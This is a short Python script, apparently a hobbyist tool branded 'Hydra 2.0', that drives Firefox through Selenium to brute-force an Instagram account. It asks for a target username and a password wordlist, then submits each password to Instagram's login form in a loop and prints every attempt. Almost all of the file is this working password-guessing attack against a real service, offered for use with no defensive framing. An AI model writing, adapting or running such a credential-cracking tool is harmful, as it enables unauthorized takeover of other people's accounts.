from selenium import webdriver
from colorama import Fore
import time as t
import os

# clear a screen 

clear_screen = lambda: os.system('cls')
clear_screen()

bnaner_txt = '''
   -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
--       ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗         ██████╗     ██████╗ --
--  ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗        ╚════██╗   ██╔═████╗     --
--  ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║         █████╔╝   ██║██╔██║     --
--  ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║        ██╔═══╝    ████╔╝██║     --
--  ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║        ███████╗██╗╚██████╔╝     --
--  ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝        ╚══════╝╚═╝ ╚═════╝      --
   -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
               Made by    :-  Dev Singh
               version    :-  0.1
               contact us :-  devsingh9234@gmail.com                                     
    '''

print(bnaner_txt)

# color change

print(Fore.GREEN)
user = input("Enter instagram username to you crack password:- ")
print(Fore.YELLOW)
passlist = input("Enter your password list location:- ")

pss = open(passlist, 'r')

# selenium

driver = webdriver.Firefox()
driver.get("https://www.instagram.com")

t.sleep(5)

for i in pss:
    username = driver.find_element("name", 'username')
    username.send_keys(user)

    password = driver.find_element("name", 'password')
    password.send_keys(i)
    
    print(Fore.RED)
    print("Try Password :- ")
    print(Fore.GREEN)
    print(i)

    submit = driver.find_element("css selector", '.L3NKy')
    submit.submit()

    t.sleep(2)
    username.clear()
    password.clear()